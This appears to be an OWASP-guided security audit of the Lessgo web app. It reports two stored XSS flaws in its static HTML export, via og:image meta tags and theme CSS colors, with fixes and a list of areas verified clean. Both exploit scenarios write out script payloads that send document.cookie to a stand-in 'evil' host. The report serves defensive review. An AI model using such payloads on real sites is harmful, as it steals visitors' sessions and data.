# Security Review — Lessgo (full app, OWASP-guided)

**Date:** 2026-07-06
**Scope:** Full application security review (not limited to branch diff). Fanned out across auth/API, publishing/static-export/domains/SSRF, and injection/crypto/data-exposure. Each candidate independently verified to filter false positives; only findings at confidence ≥8 are reported.

**Result:** 2 confirmed HIGH stored-XSS findings, both in the static HTML generator (`src/lib/staticExport/htmlGenerator.ts`). Same root cause: owner-controlled fields baked into published static HTML without `escapeHTML()`, executing in third-party visitors' browsers on platform-hosted origins.

---

# Vuln 1: Stored XSS — unescaped `og:image` / `twitter:image` meta content: `src/lib/staticExport/htmlGenerator.ts:272,280`

* **Severity:** High
* **Category:** `xss` (stored)
* **Confidence:** 9/10
* **Description:** `ogImage` is interpolated raw into the `content="..."` attribute of the `og:image` and `twitter:image` meta tags, unlike every sibling meta field (title, description, og:title, etc.) which is wrapped in `escapeHTML()`. The value originates from owner-controlled `seo.ogImage` or `previewImage`, validated only by zod `.url()` (`src/lib/validation.ts:48-52,93`). Zod v3 `.url()` only checks that `new URL()` does not throw and returns the input string unchanged; the WHATWG parser accepts `"`, `<`, `>` in the path without throwing. So the payload passes validation and is stored/rendered verbatim. `resolveOgImage()` (`src/lib/staticExport/buildPageMetadata.ts:92-97`) returns the raw string with no normalization, and `validateAndResolveAssetURLs` (`assetResolver.ts`) only rewrites `src=`/`background-image` — it never touches `content=` meta attributes.
* **Exploit Scenario:** An authenticated page owner sets `previewImage` (accepted directly in the publish body at `src/app/api/publish/route.ts:47`) or `seo.ogImage` to `https://a.com/"><script>fetch('//evil/'+document.cookie)</script>`. On publish, the static HTML head renders `<meta property="og:image" content="https://a.com/"><script>...</script>">`. The `"` closes the attribute, `>` closes the tag, and the injected `<script>` executes for every public visitor of `/p/[slug]` — served on platform origins (`*.lessgo.site`, legacy `lessgo.ai` subpaths) and on custom domains. This is stored XSS against third-party visitors (form/lead keylogging, phishing, session/wallet theft, redirect), not self-XSS.
* **Recommendation:** Wrap both interpolations in `escapeHTML(ogImage)` at lines 272 and 280, matching title/description. Additionally, normalize stored image URLs via `new URL(x).href` (which percent-encodes breakout chars) and/or tighten the zod schema to reject `"`, `<`, `>`.

---

# Vuln 2: Stored XSS — unescaped theme color values (CSS `</style>` breakout): `src/lib/staticExport/htmlGenerator.ts:170,323-331`

* **Severity:** High
* **Category:** `xss` (stored)
* **Confidence:** 8/10
* **Description:** `generateThemeVariables()` reads `theme.colors.accentColor`, `sectionBackgrounds.*`, `gradientColors.*`, and `textColors.*` verbatim (`htmlGenerator.ts:162-188`), and `generateCSSVariablesStyle()` concatenates each into an inline `<style>` block with no escaping (`\`  ${key}: ${value};\``, lines 323-331), interpolated into `<head>` at line 290. The publish schema does not validate theme shape — `PublishSchema.content` is `z.unknown()` (`src/lib/validation.ts:89`) and the request `content` is taken straight from the body, not re-read from the DB (`src/app/api/publish/route.ts:47`; `renderPublishedExport.ts:114`). `sanitizeContentForPublish()` (`src/modules/sections/layoutElementSchema.ts:352-409`) only gates section elements/collections — it never touches `content.layout.theme`. No hex/CSS-color allowlist exists anywhere on the publish path.
* **Exploit Scenario:** An authenticated owner POSTs to `/api/publish` with `content.layout.theme.colors.accentColor = "red } </style><script>fetch('//evil/'+document.cookie)</script><style> :root{"`. The `}` closes the CSS rule, `</style>` closes the style element, and the injected `<script>` executes for every visitor of the published page. The published renderer deliberately escapes all section content via `renderToStaticMarkup` to prevent exactly this — the theme-CSS path defeats that control, letting an owner run arbitrary JS in visitors' browsers on lessgo-hosted origins.
* **Recommendation:** Validate theme color values before baking them into the `<style>` block — strict allowlist (`^#[0-9a-fA-F]{3,8}$`, or a restricted `rgb()`/`hsl()`/named-color grammar), or at minimum reject any value containing `;`, `}`, `<`, `>`, or `@`. Apply in `generateThemeVariables` or a dedicated theme sanitizer at the publish entry point.

---

## Excluded / verified-clean (not reported)

- **`/api/regenerate-content` and `/api/market-insights` — missing auth/credit gate (verified true).** Both accept anonymous requests and drive the AI providers on company keys with no auth or credit consumption. Excluded because the only distinct impact is compute/credit consumption — resource/cost abuse falls under the hard DoS/resource-exhaustion exclusion. No data exposure, SSRF, injection, or auth-bypass to protected data. (Consistent with the known "Class B unauth compute-spend routes deferred" project note. Worth fixing operationally, just not a reportable security vuln under these rules.)
- **SSRF crawlers** (`fetchSite.ts` + `ssrfGuard.ts`): resolves and blocks private/loopback/link-local/CGNAT/ULA/IPv4-mapped ranges on every IP, pins the validated IP via custom undici `connect.lookup` (closes DNS-rebinding TOCTOU), re-validates each redirect hop, forces `text/html` + byte cap. Sound.
- **blob-proxy**: accepts only `route:`-prefixed KV keys resolved to platform-written blob URLs — no path traversal / arbitrary read.
- **AuthZ model**: `assertProjectOwner()` applied uniformly on token-scoped routes; token alone is not treated as authorization. Ownership checked on all `PublishedPage`/domain mutations.
- **Stripe webhook**: verifies signature, trusts only server-set `metadata.userId`.
- **Admin routes**: gated by `requireAdmin()`; `env-check` returns only booleans + a truncated URL prefix.
- **Injection**: no `$queryRaw*`/`$executeRaw*` in app code (only generated Prisma); no `child_process`/`exec`/`eval` in app code.
- **Crypto/tokens**: access tokens `nanoid(12)`, domain-verify `crypto.randomBytes(24)`, CSRF `randomBytes(32)` + `timingSafeEqual`; no weak ciphers/hardcoded keys.
- **Integration secrets**: ConvertKit key read server-side, never returned in responses or embedded in published HTML.
- **JSON-LD**: `serializeJsonLd` escapes `<` → `<` (breakout-safe).

### Lower-priority observations (below reporting bar, noted for awareness)
- CSRF middleware (`withCSRFProtection`) is defined but wired to zero routes; state-changing routes rely on Clerk `SameSite=Lax` session cookies (blocks classic CSRF, so not >80% exploitable — but wiring it up is good defense-in-depth).
- `UserIntegration.apiKey` schema comment says "Encrypted" but keys are stored plaintext (data-at-rest only; never exposed via API/published page — out of scope).
- `requireAdmin` uses `===` on `CRON_SECRET` rather than a timing-safe compare (theoretical network timing side-channel).
